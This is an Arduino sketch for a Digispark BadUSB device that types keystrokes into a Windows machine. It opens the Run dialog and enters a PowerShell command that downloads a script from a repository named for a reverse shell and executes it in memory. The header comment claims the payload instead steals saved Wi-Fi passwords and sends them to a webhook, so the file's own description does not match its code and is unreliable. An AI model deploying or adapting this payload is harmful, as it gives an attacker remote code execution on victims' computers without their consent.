/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren
 rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]
*/


#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //pReturn/Enter Key

void setup() {
  pinMode(0, OUTPUT); //LED on Model A 
}

void loop() { 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(300);
  DigiKeyboard.println("powershell IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/Saboor-Hakimi/revshell-payload-rd/main/shell.ps1')");
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500); 
  DigiKeyboard.delay(500000000000); 
  
}
